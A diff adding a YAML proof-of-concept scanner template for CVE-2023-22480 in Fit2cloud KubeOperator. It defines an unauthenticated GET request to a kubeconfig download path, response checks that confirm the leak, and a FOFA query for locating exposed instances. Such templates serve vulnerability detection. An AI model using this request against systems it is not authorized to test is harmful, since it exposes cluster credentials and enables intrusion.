@@ -1,0 +1,23 @@
+id: poc-yaml-fit2cloud-kubeoperator-sensitive-information-leak
+info:
+  name: Fit2cloud Kubeoperator敏感信息泄露(CVE-2023-22480)
+  severity: high
+  tags:
+  - CVE-2023-22480
+  - 信息泄露
+  finger: kubeoperator
+  fofa: app="KubeOperator"
+requests:
+- method: GET
+  path: /api/v1/clusters/kubeconfig/k8s
+  expression: 'status_code == 200
+
+    && contains(body,"apiVersion")
+
+    && contains(body,"clusters")
+
+    && contains(headers,"application/download")
+
+    '
+variables: {}
+transport: http
